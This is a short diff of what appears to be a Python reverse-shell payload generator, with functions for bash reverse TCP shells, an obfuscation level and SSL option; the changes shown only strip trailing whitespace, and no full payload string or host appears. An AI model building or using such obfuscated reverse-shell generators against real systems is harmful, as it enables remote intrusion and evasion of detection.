@@ -23,7 +23,7 @@ def make_raw(ip, port, use_ssl):
 		)
 
 	return raw
-	
+
 
 def generate_bash_reverse_tcp(ip, port, obs, use_ssl):
 	if obs == 0:
@@ -117,7 +117,7 @@ def generate_bash_reverse_tcp_obs2(ip, port, use_ssl):
 
 		inner = "; ".join(parts)
 		payload = f"bash -c '{inner}'"
-	
+
 	return payload
 
 
